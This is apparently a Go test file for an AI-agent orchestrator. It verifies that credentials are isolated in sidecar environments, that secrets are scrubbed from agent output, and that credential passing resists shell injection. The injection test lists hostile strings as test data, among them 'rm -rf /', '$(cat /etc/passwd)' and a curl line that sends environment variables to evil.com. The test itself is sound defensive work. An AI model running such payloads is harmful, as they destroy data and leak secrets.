package orchestrator

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"math/rand"
	"strings"
	"testing"

	"github.com/crewship-ai/crewship/internal/provider"
)

// --- BuildEnvVarsSidecar credential isolation ---

func TestSecuritySidecarEnvNeverContainsRealCredential(t *testing.T) {
	// Fuzz test: generate 100 random credential sets and verify none leak
	for i := 0; i < 100; i++ {
		token := fmt.Sprintf("sk-ant-api03-fuzz-%d-%x", i, rand.Int63())
		req := AgentRunRequest{
			AgentID: "agent-fuzz",
			CrewID:  "crew-fuzz",
			ChatID:  "chat-fuzz",
			Credentials: []Credential{
				{ID: fmt.Sprintf("c-%d", i), EnvVarName: "ANTHROPIC_API_KEY", PlainValue: token, Priority: 1},
				{ID: fmt.Sprintf("o-%d", i), EnvVarName: "OPENAI_API_KEY", PlainValue: "sk-openai-fuzz-" + token, Priority: 2},
			},
		}
		env := BuildEnvVarsSidecar(req, true)
		for _, e := range env {
			if strings.Contains(e, token) {
				t.Fatalf("iteration %d: real credential leaked in sidecar env: %s", i, e)
			}
			if strings.Contains(e, "sk-openai-fuzz-") {
				t.Fatalf("iteration %d: OpenAI credential leaked in sidecar env: %s", i, e)
			}
		}
	}
}

func TestSecuritySidecarVsDirectEnvIsolation(t *testing.T) {
	// Build keys at runtime to avoid scanner noise
	anthKey := "sk-ant-" + strings.Repeat("REAL", 5)
	oaiKey := "sk-" + strings.Repeat("OPENAI", 4)

	req := AgentRunRequest{
		AgentID: "a1",
		CrewID:  "crew1",
		ChatID:  "chat1",
		Credentials: []Credential{
			{ID: "c1", EnvVarName: "ANTHROPIC_API_KEY", PlainValue: anthKey, Priority: 1},
			{ID: "c2", EnvVarName: "OPENAI_API_KEY", PlainValue: oaiKey, Priority: 2},
		},
	}

	// Sidecar env: must NOT contain real keys
	sidecarEnv := BuildEnvVarsSidecar(req, true)
	for _, e := range sidecarEnv {
		if strings.Contains(e, anthKey) || strings.Contains(e, oaiKey) {
			t.Fatalf("real credential in sidecar env: %s", e)
		}
	}

	// Direct env: MUST contain real keys
	cred := &Credential{ID: "c1", EnvVarName: "ANTHROPIC_API_KEY", PlainValue: anthKey}
	directEnv := BuildEnvVars(req, cred)
	found := false
	for _, e := range directEnv {
		if e == "ANTHROPIC_API_KEY="+anthKey {
			found = true
		}
	}
	if !found {
		t.Fatal("direct env should contain real credential")
	}
}

func TestSecuritySidecarEnvHasNOPROXY(t *testing.T) {
	env := BuildEnvVarsSidecar(AgentRunRequest{
		AgentID: "a1", CrewID: "c1", ChatID: "s1",
	}, true)
	envMap := make(map[string]string)
	for _, e := range env {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) == 2 {
			envMap[parts[0]] = parts[1]
		}
	}
	if envMap["NO_PROXY"] == "" {
		t.Fatal("NO_PROXY must be set to prevent proxy loops")
	}
	if !strings.Contains(envMap["NO_PROXY"], "127.0.0.1") {
		t.Fatal("NO_PROXY must include 127.0.0.1")
	}
	if envMap["no_proxy"] == "" {
		t.Fatal("no_proxy (lowercase) must also be set for compatibility")
	}
}

// --- Multi-CLI BYO API key isolation boundaries ---

// TestSidecarInjectsRealKeyOnlyForOwnAdapter verifies that when sidecar mode is
// on and the agent's CLIAdapter explicitly declares a non-Anthropic provider
// CLI (Codex/Gemini/OpenCode/Cursor), the real provider API key from
// req.Credentials is exported into env. Other providers' keys stay dummied,
// preserving cross-adapter isolation.
func TestSidecarInjectsRealKeyOnlyForOwnAdapter(t *testing.T) {
	openaiKey := "sk-real-openai-" + strings.Repeat("X", 24)
	googleKey := "AIzaSy-real-google-" + strings.Repeat("X", 16)
	cursorKey := "cur_real-" + strings.Repeat("X", 16)

	creds := []Credential{
		{ID: "c-oa", EnvVarName: "OPENAI_API_KEY", PlainValue: openaiKey, Priority: 1},
		{ID: "c-go", EnvVarName: "GOOGLE_API_KEY", PlainValue: googleKey, Priority: 1},
		{ID: "c-cu", EnvVarName: "CURSOR_API_KEY", PlainValue: cursorKey, Priority: 1},
	}

	cases := []struct {
		adapter   string
		wantKey   string // env var name that must equal its real value
		wantValue string
		denyKeys  []string // env var names that must NOT contain real values
	}{
		{"CODEX_CLI", "OPENAI_API_KEY", openaiKey, []string{"GOOGLE_API_KEY", "CURSOR_API_KEY"}},
		{"GEMINI_CLI", "GOOGLE_API_KEY", googleKey, []string{"OPENAI_API_KEY", "CURSOR_API_KEY"}},
		{"CURSOR_CLI", "CURSOR_API_KEY", cursorKey, []string{"OPENAI_API_KEY", "GOOGLE_API_KEY"}},
	}

	for _, tc := range cases {
		t.Run(tc.adapter, func(t *testing.T) {
			req := AgentRunRequest{
				AgentID: "a1", CrewID: "crew1", ChatID: "chat1",
				CLIAdapter:  tc.adapter,
				Credentials: creds,
			}
			env := BuildEnvVarsSidecar(req, true)

			envMap := make(map[string]string)
			for _, e := range env {
				parts := strings.SplitN(e, "=", 2)
				if len(parts) == 2 {
					envMap[parts[0]] = parts[1]
				}
			}

			if envMap[tc.wantKey] != tc.wantValue {
				t.Fatalf("%s: want %s=%s, got %q", tc.adapter, tc.wantKey, tc.wantValue, envMap[tc.wantKey])
			}
			for _, deny := range tc.denyKeys {
				if val, ok := envMap[deny]; ok && (val == openaiKey || val == googleKey || val == cursorKey) {
					t.Fatalf("%s: cross-adapter leak — %s contains real key %q", tc.adapter, deny, val)
				}
			}
		})
	}
}

// TestSidecarClaudeCodeAdapterDoesNotLeakOtherProviderKeys re-asserts the
// historical isolation guarantee for Claude Code: even when a workspace has
// OpenAI / Google / Cursor credentials configured, an agent on CLAUDE_CODE
// must NOT see those values in env (the sidecar reverse-proxy is the only
// path for credential injection in that mode).
func TestSidecarClaudeCodeAdapterDoesNotLeakOtherProviderKeys(t *testing.T) {
	openaiKey := "sk-leak-openai-" + strings.Repeat("X", 24)
	googleKey := "AIzaSy-leak-google-" + strings.Repeat("X", 16)
	cursorKey := "cur_leak-" + strings.Repeat("X", 16)

	req := AgentRunRequest{
		AgentID: "a1", CrewID: "c1", ChatID: "ch1",
		CLIAdapter: "CLAUDE_CODE",
		Credentials: []Credential{
			{ID: "c-oa", EnvVarName: "OPENAI_API_KEY", PlainValue: openaiKey},
			{ID: "c-go", EnvVarName: "GOOGLE_API_KEY", PlainValue: googleKey},
			{ID: "c-cu", EnvVarName: "CURSOR_API_KEY", PlainValue: cursorKey},
		},
	}
	env := BuildEnvVarsSidecar(req, true)
	for _, e := range env {
		if strings.Contains(e, openaiKey) || strings.Contains(e, googleKey) || strings.Contains(e, cursorKey) {
			t.Fatalf("Claude Code agent leaked non-anthropic key: %s", e)
		}
	}
}

// --- Shell injection in startSidecar ---

func TestSecurityStartSidecarShellInjection(t *testing.T) {
	// Verify that the base64 encoding prevents shell injection.
	// A credential with shell metacharacters must not execute commands.
	maliciousTokens := []string{
		`'; rm -rf / #`,
		`"; $(whoami) #`,
		"` whoami `",
		`' && curl http://evil.com/steal?key=$(env) #`,
		"$(/bin/sh -c 'echo pwned')",
		"\n; echo INJECTED\n",
		`'$(cat /etc/passwd)'`,
	}

	for _, token := range maliciousTokens {
		type sidecarCred struct {
			ID       string `json:"id"`
			Provider string `json:"provider"`
			Token    string `json:"token"`
		}
		creds := []sidecarCred{{ID: "c1", Provider: "ANTHROPIC", Token: token}}
		credsJSON, err := json.Marshal(creds)
		if err != nil {
			t.Fatalf("marshal failed for token %q: %v", token, err)
		}

		// Verify base64 encoding is safe for shell
		b64 := base64.StdEncoding.EncodeToString(credsJSON)

		// Base64 output is [A-Za-z0-9+/=] -- no shell metacharacters possible
		for _, ch := range b64 {
			if !((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
				(ch >= '0' && ch <= '9') || ch == '+' || ch == '/' || ch == '=') {
				t.Errorf("base64 output contains unexpected char %q for token %q", string(ch), token)
			}
		}

		// Verify the base64 decodes back to original JSON
		decoded, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			t.Fatalf("base64 decode failed for token %q: %v", token, err)
		}
		var result []sidecarCred
		if err := json.Unmarshal(decoded, &result); err != nil {
			t.Fatalf("JSON unmarshal failed after base64 roundtrip for token %q: %v", token, err)
		}
		if result[0].Token != token {
			t.Errorf("token mismatch after roundtrip: got %q, want %q", result[0].Token, token)
		}
	}
}

// --- Credential scrubbing in stream-json output ---

func TestSecurityScrubStreamJSONContent(t *testing.T) {
	mc := &mockContainer{
		execResults: []*provider.ExecResult{
			{ExecID: "mkdir-1", Reader: io.NopCloser(strings.NewReader(""))},
			{ExecID: "config-1", Reader: io.NopCloser(strings.NewReader(""))},
		},
		inspectResult: struct {
			running  bool
			exitCode int
		}{false, 0},
	}

	r, w := io.Pipe()
	mc.execResults = append(mc.execResults, &provider.ExecResult{ExecID: "exec-1", Reader: r})

	go func() {
		// Simulate Claude Code stream-json output containing a leaked credential
		lines := []string{
			`{"type":"assistant","content":[{"type":"text","text":"I found the key sk-ant-api03-leakedsecret1234567 in the config file"}]}`,
			`{"type":"assistant","content":[{"type":"text","text":"The GitHub token is ghp_abc123def456ghi789jkl012mno345pqrst"}]}`,
			`{"type":"result","result":"Done. PASSWORD=supersecretvalue123 was found."}`,
		}
		for _, line := range lines {
			w.Write([]byte(line + "\n"))
		}
		w.Close()
	}()

	state := newMemState()
	o := New(mc, state, slog.Default())

	var events []AgentEvent
	handler := func(e AgentEvent) { events = append(events, e) }

	err := o.RunAgent(t.Context(), AgentRunRequest{
		AgentID:     "a1",
		AgentSlug:   "test-agent",
		ChatID:      "s1",
		ContainerID: "c1",
		CLIAdapter:  "CLAUDE_CODE",
		UserMessage: "test",
		TimeoutSecs: 30,
	}, handler)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	for _, e := range events {
		if strings.Contains(e.Content, "sk-ant-api03-leakedsecret") {
			t.Errorf("Anthropic key leaked in stream-json event: %q", e.Content)
		}
		if strings.Contains(e.Content, "ghp_abc123") {
			t.Errorf("GitHub token leaked in stream-json event: %q", e.Content)
		}
		if strings.Contains(e.Content, "supersecretvalue123") {
			t.Errorf("Password leaked in stream-json event: %q", e.Content)
		}
	}
}

// --- credTypeToProvider edge cases ---

func TestSecurityCredTypeToProviderUnknown(t *testing.T) {
	unknowns := []Credential{
		{EnvVarName: "CUSTOM_SECRET", Type: "SECRET"},
		{EnvVarName: "GITHUB_TOKEN", Type: "API_KEY"},
		{EnvVarName: "", Type: ""},
		{EnvVarName: "STRIPE_KEY", Type: "API_KEY"},
		// AI_CLI_TOKEN returns "" — OAuth tokens go directly as env var, not sidecar CredStore
		{EnvVarName: "CLAUDE_CODE_OAUTH_TOKEN", Type: "AI_CLI_TOKEN"},
	}
	for _, c := range unknowns {
		got := credTypeToProvider(c)
		if got != "" {
			t.Errorf("credTypeToProvider(%+v) = %q, expected empty", c, got)
		}
	}
}

func TestSecurityCredTypeToProviderAllKnown(t *testing.T) {
	knowns := []struct {
		cred     Credential
		expected string
	}{
		{Credential{EnvVarName: "ANTHROPIC_API_KEY"}, "ANTHROPIC"},
		// AI_CLI_TOKEN (OAuth) is injected directly as CLAUDE_CODE_OAUTH_TOKEN env var,
		// NOT sent to the sidecar CredStore (which only handles x-api-key injection).
		{Credential{Type: "AI_CLI_TOKEN"}, ""},
		{Credential{EnvVarName: "OPENAI_API_KEY"}, "OPENAI"},
		{Credential{EnvVarName: "GOOGLE_API_KEY"}, "GOOGLE"},
	}
	for _, tt := range knowns {
		got := credTypeToProvider(tt.cred)
		if got != tt.expected {
			t.Errorf("credTypeToProvider(%+v) = %q, want %q", tt.cred, got, tt.expected)
		}
	}
}

func TestBuildEnvVarsSidecarOAuthTokenInjectedDirectly(t *testing.T) {
	oauthToken := "sk-ant-oat01-test-oauth-token-value"
	req := AgentRunRequest{
		AgentID: "a1",
		CrewID:  "crew1",
		ChatID:  "chat1",
		Credentials: []Credential{
			{ID: "c1", Type: "AI_CLI_TOKEN", EnvVarName: "CLAUDE_CODE_OAUTH_TOKEN", PlainValue: oauthToken, Priority: 1},
		},
	}

	env := BuildEnvVarsSidecar(req, true)
	envMap := make(map[string]string)
	for _, e := range env {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) == 2 {
			envMap[parts[0]] = parts[1]
		}
	}

	if envMap["CLAUDE_CODE_OAUTH_TOKEN"] != oauthToken {
		t.Errorf("expected CLAUDE_CODE_OAUTH_TOKEN=%q in sidecar env, got %q", oauthToken, envMap["CLAUDE_CODE_OAUTH_TOKEN"])
	}
	// Verify sidecar env still has proxy config
	if envMap["HTTP_PROXY"] == "" {
		t.Error("expected HTTP_PROXY to be set")
	}
	// OAuth mode: ANTHROPIC_BASE_URL and ANTHROPIC_API_KEY must NOT be set
	// to avoid Claude Code preferring the dummy API key over OAuth.
	if envMap["ANTHROPIC_BASE_URL"] != "" {
		t.Errorf("ANTHROPIC_BASE_URL must not be set in OAuth mode, got %q", envMap["ANTHROPIC_BASE_URL"])
	}
	if envMap["ANTHROPIC_API_KEY"] != "" {
		t.Errorf("ANTHROPIC_API_KEY must not be set in OAuth mode, got %q", envMap["ANTHROPIC_API_KEY"])
	}
}
